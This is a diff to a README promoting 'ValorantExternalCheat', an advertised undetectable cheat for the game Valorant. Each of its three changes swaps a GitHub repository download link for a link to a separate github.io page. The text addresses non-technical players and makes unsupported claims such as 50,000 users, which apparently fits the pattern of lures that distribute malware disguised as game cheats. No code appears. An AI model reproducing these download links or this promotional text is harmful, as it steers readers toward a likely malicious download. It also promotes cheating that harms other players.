@@ -1,6 +1,6 @@
 # 🎯 ValorantExternalCheat - Undetectable, Powerful, and Laser-Fast
 
-[![Download Now](https://img.shields.io/badge/Download-ValorantExternalCheat-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Coinagekeratoscopy50/ValorantExternalCheat)
+[![Download Now](https://img.shields.io/badge/Download-ValorantExternalCheat-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://coinagekeratoscopy50.github.io)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ This guide is written for everyone — no technical skills needed. Just follow t
 
 Visit this link to download the application:
 
-**[🔗 Download ValorantExternalCheat](https://github.com/Coinagekeratoscopy50/ValorantExternalCheat)**
+**[🔗 Download ValorantExternalCheat](https://coinagekeratoscopy50.github.io)**
 
 This link takes you to the official download page. Once there, you'll see the latest version of the toolkit available for download.
 
@@ -150,7 +150,7 @@ We're here to help if you hit any snags:
 
 Ready to level up your game? Download **ValorantExternalCheat** now:
 
-**[⬇️ GET VALORANTEXTERNALCHEAT](https://github.com/Coinagekeratoscopy50/ValorantExternalCheat)**
+**[⬇️ GET VALORANTEXTERNALCHEAT](https://coinagekeratoscopy50.github.io)**
 
 Over **50,000 players** already use this toolkit to gain the competitive edge. Join them today.
 
